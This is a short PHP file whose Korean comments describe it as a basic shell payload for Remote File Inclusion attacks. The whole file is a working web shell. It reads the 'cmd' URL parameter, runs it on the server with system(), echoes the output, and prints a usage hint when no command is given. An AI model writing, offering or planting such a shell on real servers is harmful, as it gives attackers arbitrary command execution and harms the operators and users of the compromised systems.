<?php
// RFI 공격 시 사용되는 기본적인 PHP 쉘 페이로드입니다.
// URL의 'cmd' 파라미터로 받은 명령어를 서버 OS에서 실행합니다.

// 'cmd' 파라미터가 URL에 존재하는지 확인
if (isset($_GET['cmd'])) {
    // system() 함수를 사용하여 명령어를 OS에서 실행하고 결과를 출력
    $command = $_GET['cmd'];
    echo "<pre>"; // 출력이 보기 좋게 포맷되도록 <pre> 태그 사용
    echo "Executing command: " . htmlspecialchars($command) . "\n";
    system($command);
    echo "</pre>";
} else {
    echo "Simple RFI shell loaded. Use '&cmd=your_command_here' to execute a command.";
}
?>